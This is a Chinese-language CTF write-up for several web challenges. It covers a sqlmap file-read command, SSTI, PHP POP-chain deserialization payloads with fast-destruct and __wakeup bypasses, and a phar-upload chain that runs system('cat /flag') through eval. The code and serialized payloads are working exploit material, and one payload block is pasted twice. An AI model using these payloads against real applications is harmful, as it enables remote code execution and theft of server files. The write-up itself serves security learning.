# ex-图书馆

​	还是一道sql注入题。

​	使用`--file-read=`参数读取本地文件

```
sqlmap -u "http://hostname.com/book?id=1" --cookie="COOKIE"  --file-read="/flag
```

# ssti

​	服务器模板注入

​		https://tttang.com/archive/1698/

​		https://www.anquanke.com/post/id/226900

​	自己构建payload就好懒得构建了捏

# ex-ssti

​	同上，有很多过滤，使用fenjing就好了，不多说了。

# ezpop

php反序列化

```php
<?php
highlight_file(__FILE__);

class night
{
    public $night;

    public function __destruct(){
        echo $this->night . '哒咩哟';
    }
}

class day
{
    public $day;

    public function __toString(){
        echo $this->day->go();
    }

    public function __call($a, $b){
        echo $this->day->getFlag();
    }
}


class light
{
    public $light;

    public function __invoke(){
        echo $this->light->d();
    }
}

class dark
{
    public $dark;

    public function go(){
        ($this->dark)();
    }

    public function getFlag(){
        include(hacked($this->dark));
    }
}

function hacked($s) {
    if(substr($s, 0,1) == '/'){
        die('呆jio步');
    }
    $s = preg_replace('/\.\.*/', '.', $s);
    $s = urldecode($s);
    $s = htmlentities($s, ENT_QUOTES, 'UTF-8');
    return strip_tags($s);
}

$un = unserialize($_POST['pop']);
throw new Exception('seino');
```

```php
// pop链
// night->day->dark1(go)->light->day->dark2(getflag)

$dark2 = new dark();
$dark2->dark = "php://filter/convert.base64-encode/resource=/flag";

$day = new day();
$day->day = $dark2;

$light = new light();
$light->light = $day;

$dark1 = new dark();
$dark1->dark = $light;

$day2 = new day();
$day2->day = $dark1;

$night = new night();
$night->night = $day2;

$pop = serialize($night);

// O:5:"night":1:{s:5:"night";O:3:"day":1:{s:3:"day";O:4:"dark":1:{s:4:"dark";O:5:"light":1:{s:5:"light";O:3:"day":1:{s:3:"day";O:4:"dark":1:{s:4:"dark";s:49:"php://filter/convert.base64-encode/resource=/flag";}}}}}}
```

​	但是由于php报错他会直接杀死这个进程，就不会调用__destruct()，所以这里要用到fast destruct，我们修改序列化的字符串为：

```php
O:5:"night":3:{s:5:"night";O:3:"day":1:{s:3:"day";O:4:"dark":1:{s:4:"dark";O:5:"light":1:{s:5:"light";O:3:"day":1:{s:3:"day";O:4:"dark":1:{s:4:"dark";s:49:"php://filter/convert.base64-encode/resource=/flag";}}}}}

// night后1改为任意数字，删除最后的}即可
```

​	之后POST上去就拿到flag了。

# mew

​	首先dirsearch扫到www.zip，访问下载下来。

```php
// index.php
include 'class.php';
$select = $_GET['select'];
$res=unserialize(@$select);

// class.php
<?php
include 'flag.php';


error_reporting(0);


class Name{
    public $username = 'nonono';
    public $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

            
        }
    }
}
?>
```

​	**__wakeup 绕过**：PHP 5.6.25 及之前版本、PHP 7.0.10 及之前版本中，当序列化字符串中表示对象属性个数的值大于真实属性个数时，`__wakeup()`方法会被绕过。

```php
// O:4:"Name":2:{s:8:"username";s:5:"admin";s:8:"password";s:3:"100";}
// 之后把"Name"后的2换成3就可以绕过
// O:4:"Name":3:{s:8:"username";s:5:"admin";s:8:"password";s:3:"100";}
// O%3a4%3a%22Name%22%3a3%3a%7bs%3a8%3a%22username%22%3bs%3a5%3a%22admin%22%3bs%3a8%3a%22password%22%3bs%3a3%3a%22100%22%3b%7d
```

# ex-phar

​	dirsearch扫描到www.zip，直接下载下来，得到如下代码：

```php
// classes.php

<?php
class Base{
    public $dataReader;
    private $each;
    private $value;
    private $key;
    private $query;
    public $batch;

    public function rewind()
    {
        $this->reset();
        $this->next();
    }

    public function next()
    {
        if ($this->batch === null || !$this->each || $this->each && next($this->batch) === false) {
            $this->batch = $this->fetchData();
            reset($this->batch);
        }

        if ($this->each) {
            $this->value = current($this->batch);
            if ($this->query->indexBy !== null) {
                $this->key = key($this->batch);
            } elseif (key($this->batch) !== null) {
                $this->key = $this->key === null ? 0 : $this->key + 1;
            } else {
                $this->key = null;
            }
        } else {
            $this->value = $this->batch;
            $this->key = $this->key === null ? 0 : $this->key + 1;
        }
    }

    public function reset()
    {
        if($this->dataReader !== null) {
            $this->dataReader->close();
        }
    }

    public function __destruct()
    {
        $this->reset();
    }
}

class Stream{
    public $closes;
    private $getMetadata;
    private $getContents;
    private $read;
    private $isReadable;

    public function isReadable()
    {
        return call_user_func($this->isReadable);
    }

    public function read($length)
    {
        return call_user_func($this->read, $length);
    }

    public function getContents()
    {
        return call_user_func($this->getContents);
    }

    public function getMetadata($key = null)
    {
        return call_user_func($this->getMetadata, $key);
    }
    public function close()
    {
        return call_user_func($this->closes);
    }
}

class Mock{
    public $mockName;
    public $classCode;
    public function generate(){
        if(!class_exists($this->mockName, false)){
            eval($this->classCode);
        }
        return $this->mockName;
    }

    public function getClassCode()
    {
        return $this->classCode;
    }
}
```

```php+HTML
// index.php

<!DOCTYPE html>
<html>
<head>
    <title>Just Upload!</title>
    <meta charset="UTF-8">
    <style>
        .container {
            display: flex;
            flex-direction: row;
            text-align: center;
            height: 100vh;
        }
        .left {
            flex: 1;
            background-color: #f2f2f2;
            padding: 20px;
        }
        .right {
            flex: 1;
            background-color: #e6e6e6;
            padding: 20px;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="left">
        <h1>文件探测</h1>
        <hr><br>
        <form action="index.php" method="get">
            <label for="name">:</label>
            <input type="text" name="filename"><br><br>
            <input type="submit" value="查询文件">
        </form><br>
        <?php
        error_reporting(1);
        include("classes.php");
        if(isset($_GET['filename']))
        {
            file_exists($_GET['filename']);
            throw new Exception("Unfinished Function!");
        }
        ?>
    </div>
    <div class="right">
        <h1>文件上传</h1>
        <hr><br>
        <form action="index.php" method="post" enctype="multipart/form-data">
            <input type="file" name="file"><br><br>
            <input type="submit" value="上传文件">
        </form><br>
        <?php
            $allowedExts = array("jpg", "png", "gif");
            if(isset($_FILES["file"])){
                $temp = explode(".", $_FILES["file"]["name"]);
                $extension = end($temp);
                if (($_FILES["file"]["size"] < 20000) && in_array($extension, $allowedExts)) {
                    if ($_FILES["file"]["error"] > 0) {
                        echo "Error：" . $_FILES["file"]["error"] . "<br>";
                    } else {
                        if (file_exists("tmp/" . $_FILES["file"]["name"])) {
                            echo $_FILES["file"]["name"] . " already exists. ";
                        } else {
                            $filename = "/tmp/" . md5(random_int(100000,999999).$_FILES["file"]["name"]).".".$extension;
                            move_uploaded_file($_FILES["file"]["tmp_name"], $filename);
                            echo "文件已上传至：" . $filename;
                        }
                    }
                } else {
                    echo "非法文件！";
                }
            }
        ?>
    </div>
</div>
</body>
</html>
```

​	这道题是一个phar反序列化，思路是通过文件上传接口上传phar文件，之后通过文件探测接口通过phar://伪协议触发metadata的反序列化来获取flag。

​	注意页面存在报错，所以要通过fast destruct。

​	pop链：

```
Base(__destruct)->Base(reset)->Stream(close)->Mock(generate)
```

```php
$mock = new Mock();$mock = new Mock();
$mock->mockName = '114514';
$mock->classCode = "system('cat /flag');";

$Stream = new Stream();
$Stream->closes = [$mock, 'generate'];

$Base = new Base();
$Base->dataReader = $Stream;

$phar = new Phar('classes.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($Base);
$phar->addFromString('test.txt', 'qwq');
$phar->stopBuffering();

$mock->mockName = '114514';
$mock->classCode = "system('cat /flag');";

$Stream = new Stream();
$Stream->closes = [$mock, 'generate'];

$Base = new Base();
$Base->dataReader = $Stream;

$phar = new Phar('classes.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($Base);
$phar->addFromString('test.txt', 'qwq');
$phar->stopBuffering();
```

​	输出classes.phar之后通过python脚本生成fast destruct处理后的phar文件上传到服务器。

​	改名为classes.png，上传到/tmp/3f93b44b705dc6e6c6ed483379a42772.png目录

​	访问http://hostname.com/index.php?filename=phar://../../../../../../../tmp/3f93b44b705dc6e6c6ed483379a42772.png触发phar反序列化，拿到flag。
